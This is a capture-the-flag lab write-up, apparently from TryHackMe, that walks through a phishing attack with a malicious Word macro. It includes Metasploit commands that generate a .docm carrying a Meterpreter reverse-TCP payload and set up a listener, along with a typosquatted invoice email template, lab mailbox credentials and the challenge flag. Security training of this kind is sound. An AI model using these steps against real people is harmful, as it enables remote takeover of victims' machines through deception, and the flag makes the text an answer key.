In this challenge, I will tell the the process of carrying out a phishing attack using a malicious macro embedded in a Microsoft Word document. This technique demonstrates how attackers can exploit the macro feature in documents to deliver payloads and gain control over a target system.

### Learning Outcomes

- Understand how phishing attacks work and how they manipulate human behavior.
- Learn how to exploit Microsoft Office macros for malicious purposes.
- Create a phishing attack that uses a macro to execute a reverse shell.

## Phishing Attacks Overview

Phishing is a form of social engineering that tricks users into performing an action, like clicking a malicious link or opening a harmful document. Instead of exploiting vulnerabilities in software, attackers leverage human error to bypass security defenses. In this challenge, the "bait" comes in the form of an email with an attachment that urges the user to open it, which contains a malicious macro designed to establish a reverse shell.

The main goal of the phishing email is to convince the target to open the malicious document. This action will trigger the macro, allowing the attacker to execute commands on the victim's system and gain remote access.

## Macros in MS Office Documents

A macro is a small set of instructions used to automate tasks. In Microsoft Office applications like Word, macros are often used to simplify repetitive tasks, such as formatting or inserting text. Unfortunately, they can be hijacked by attackers to execute harmful code.

For this challenge, I am going to create a document with an embedded macro that, when executed, will connect to my system and provide a reverse shell. This allows me to remotely control the target system. 

## Attack Plan

1. **Create a Document with a Malicious Macro**:
   I will use the Metasploit Framework to generate a Microsoft Word document (.docm) containing a malicious macro.
   
2. **Start Listening for Incoming Connections**:
   Before sending the document, I need to configure my system to listen for incoming reverse shell connections.
   
3. **Email the Malicious Document**:
   Once the document is ready, I will email it to the target user with an enticing subject to encourage them to open the file.

4. **Execute the Macro and Gain Control**:
   When the victim opens the document, the embedded macro will execute, sending a reverse shell connection to my system. I can now issue commands on their machine.

## Setting Up the Attacker's System

To begin the attack, I need to carry out the following steps on the attacker’s system:

1. **Create the Malicious Word Document**:
   Using Metasploit, I generate a malicious Word document with a payload that will create a reverse shell. The payload will connect back to my IP address and port.

   ### Step-by-Step Process to Create the Document:
   ```bash
   msfconsole
   set payload windows/meterpreter/reverse_tcp
   use exploit/multi/fileformat/office_word_macro
   set LHOST <Attacker_IP>
   set LPORT 8888
   exploit
   ```

2. **Listen for Incoming Connections**:
   After generating the document, I need to set up Metasploit to listen for incoming connections on the specified port.

   ### Command to Start Listening:
   ```bash
   msfconsole
   use multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <Attacker_IP>
   set LPORT 8888
   exploit
   ```

## Creating the Malicious Document

Using the Metasploit Framework's `office_word_macro` module, I create a `.docm` file that contains the malicious macro. The macro will decode a payload embedded in the "Comments" field of the document and execute it when the document is opened.

### Key Functions in the Macro:
- **AutoOpen()**: Automatically triggers when the document is opened.
- **Base64Decode()**: Decodes the payload (a Windows executable) from the "Comments" field.
- **ExecuteForWindows()**: Executes the decoded payload and connects back to the attacker's system.

## Sending the Malicious Document

Once the malicious document is ready, I can send it to the target user via email. The document will appear as a legitimate file, like an invoice or receipt, to increase the chances of the victim opening it.

I will use a domain that is similar to the target’s to perform **typosquatting**, making the email appear more convincing. Here are the login details for sending the email:

- **Email**: info@socnas.thm
- **Password**: MerryPhishMas!

Once logged in to the email service, I can compose an email that includes a convincing message, such as:

> "Dear Marta,  
> Please find attached your invoice for this month. Kindly review the details and let us know if you have any questions."

## Exploitation

When the target opens the document and enables macros (intentionally or unknowingly), the payload is decoded and executed. The reverse shell connects to my system, and I can now execute commands on the target’s machine, gaining full control.

## So...

It demonstrates how phishing attacks can leverage Microsoft Office macros to deliver a reverse shell payload. By embedding a malicious macro in a document and convincing the target to open it, attackers can bypass traditional security defenses and gain remote access to the victim's system. This type of attack highlights the importance of being cautious when opening unsolicited emails and attachments, especially from unfamiliar or suspicious sources. 

**Answers**

*What is the flag value inside the `flag.txt` file that’s located on the Administrator’s desktop?* **THM{PHISHING_CHRISTMAS}**
